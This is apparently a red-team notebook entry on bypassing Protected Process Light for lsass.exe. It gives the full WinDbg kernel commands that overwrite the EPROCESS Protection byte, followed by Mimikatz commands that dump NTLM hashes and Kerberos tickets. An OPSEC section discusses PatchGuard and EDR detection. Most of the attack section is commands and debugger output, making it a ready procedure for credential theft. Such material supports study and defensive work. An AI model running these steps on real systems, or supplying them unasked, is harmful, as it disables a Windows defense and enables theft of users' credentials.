> [!abstract] Bypassing PPL (Protected Process Light) on LSASS
> Modern Windows versions protect `lsass.exe` (the Local Security Authority Subsystem Service) using **Protected Process Light (PPL)**. When LSASS is launched as a Protected Process, standard users and even Administrators are denied the ability to open it with `PROCESS_VM_READ` rights, preventing credential dumping with tools like Mimikatz.
> 
> **The Hack:** In kernel memory, the protection level of a process is defined by a single byte inside its `_EPROCESS` structure (the `Protection` field). By overwriting this byte to `0x00`, we downgrade LSASS from a Protected Process to a normal, unprotected process. Once downgraded, Mimikatz can freely inject into LSASS and dump credentials.
> **MITRE ATT&CK Mapping:** [T1003.001 - OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/) | [T1562.001 - Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)

![[Pasted image 20260918131829.png]]
## 📊 Visualizing the Protection Downgrade

> [!info] The `_PS_PROTECTION` Structure
> Windows uses a bitwise structure called `_PS_PROTECTION` to determine how a process is protected. By modifying the raw byte value, we instantly change the process's security boundaries.

```mermaid
flowchart LR
    subgraph Before ["🛡️ Before: PPL Enabled (0x41)"]
        direction TB
        B1["Level: 0x41 (Protected Light)"]
        B2["Type: 0y001 (ProtL)"]
        B3["Signer: 0y0100 (Windows)"]
        B4["Result: Access Denied for Mimikatz"]
    end

    subgraph Command ["⚙️ Kernel Surgery"]
        C1["eb ffff978f7b29f300+0x87a 0x00"]
    end

    subgraph After ["💀 After: PPL Disabled (0x00)"]
        direction TB
        A1["Level: 0x00 (None)"]
        A2["Type: 0y000 (None)"]
        A3["Signer: 0y0000 (None)"]
        A4["Result: Access Granted for Mimikatz"]
    end

    Before --"1. Read Initial State"--> Command
    Command --"2. Overwrite Byte to 0x00"--> After

    style Before fill:#ffebee,stroke:#b71c1c,stroke-width:2px
    style Command fill:#fff3e0,stroke:#e65100,stroke-width:2px
    style After fill:#e8f5e9,stroke:#1b5e20,stroke-width:2px
```



## 🕵️‍♂️ Manual Execution (WinDbg Breakdown)

> [!example] Step-by-Step Kernel Surgery
> This requires an active Kernel Debugging session (via `kd.exe` or WinDbg) to directly manipulate kernel memory.

#### 1. Reconnaissance (Finding LSASS)
First, we locate the `_EPROCESS` structure of `lsass.exe`.

```text
1: kd> !process 0 0 lsass.exe
PROCESS ffff978f7b29f300
SessionId: 0 Cid: 02e0
DirBase: 16dee002 ObjectTable: ffffaa8cb53c5140 HandleCount: 1271.
Image: lsass.exe
```
LSASS is found at address `ffff978f7b29f300`.

#### 2. Locating the Protection Offset
We inspect the `_EPROCESS` structure to find the `Protection` field. *(Note: The offset `+0x87a` changes between different Windows builds).*

```text
1: kd> dt nt!_eprocess ffff978f7b29f300 Protection
   +0x87a Protection : _PS_PROTECTION
      +0x000 Level      : 0x41 'A'
      +0x000 Type       : 0y001
      +0x000 Audit      : 0y0
      +0x000 Signer     : 0y0100
```
The `Protection` field is at offset `0x87a`. 
- `Level: 0x41` indicates it is a Protected Process Light.
- `Signer: 0y0100` indicates it is signed by Windows (Windows TCB).

#### 3. The Downgrade (Overwriting the Byte)
We use the `eb` (Enter Byte) command to overwrite the Protection byte with `0x00`. This sets all bits (Level, Type, Signer) to zero, completely removing the protection.

```text
1: kd> eb ffff978f7b29f300+0x87a 0x00
```
- **Destination:** LSASS `_EPROCESS` + `0x87a`
- **Value:** `0x00` (No Protection)

#### 4. Verification
We read the structure one more time to ensure the downgrade was successful.

```text
1: kd> dt nt!_eprocess ffff978f7b29f300 Protection
   +0x87a Protection : _PS_PROTECTION
      +0x000 Level      : 0 ''
      +0x000 Type       : 0y000
      +0x000 Audit      : 0y0
      +0x000 Signer     : 0y0000
```
LSASS is now an unprotected process.

#### 5. Resume Execution
We resume the system execution so we can interact with LSASS from User-Mode.

```text
1: kd> g
```

---

## 💻 The `_PS_PROTECTION` Structure (Technical Deep Dive)

> [!info] Anatomy of the Protection Byte
> The `Protection` field is a 1-byte bitwise union defined in the Windows kernel as `_PS_PROTECTION`.
> 
> ```c
> typedef struct _PS_PROTECTION {
>     union {
>         UCHAR Level;
>         struct {
>             UCHAR Type   : 3;  // Bits 0-2
>             UCHAR Audit  : 1;  // Bit 3
>             UCHAR Signer : 4;  // Bits 4-7
>         };
>     };
> } PS_PROTECTION, *PPS_PROTECTION;
> ```
> 
> **When Level is 0x41 (Binary: 0100 0001):**
> - `Type` (Bits 0-2) = `001` -> `ProtectedProcessLight` (PPL)
> - `Audit` (Bit 3) = `0`
> - `Signer` (Bits 4-7) = `0100` -> `PsProtectedSignerWindows` (Signed by Windows)
> 
> **When Level is 0x00 (Binary: 0000 0000):**
> - `Type` = `000` -> `PsProtectedTypeNone`
> - `Signer` = `0000` -> `PsProtectedSignerNone`
> 
> By changing `0x41` to `0x00`, the kernel's `PsTestProtectedProcessIncompatibility` checks will pass, allowing standard OpenProcess calls to read LSASS memory.

---

> [!success] Result: Dumping LSASS
> Now that the kernel execution has resumed (`g`), you can immediately execute Mimikatz from a standard Administrator command prompt. It will successfully bypass the former PPL restriction and dump NTLM hashes and Kerberos tickets.
> ```cmd
> mimikatz # privilege::debug
> mimikatz # sekurlsa::logonpasswords
> ```

> [!danger] OPSEC & Modern Mitigations
> PatchGuard (Kernel Patch Protection) monitors critical structures. While modifying the token (`_EPROCESS.Token`) is often caught, modifying the `Protection` byte is a gray area that *might* bypass older PatchGuard signatures, but modern EDRs (like Microsoft Defender for Endpoint) heavily monitor APIs like `NtOpenProcess` and will immediately flag a non-protected process trying to read `lsass.exe` memory, regardless of PPL status.

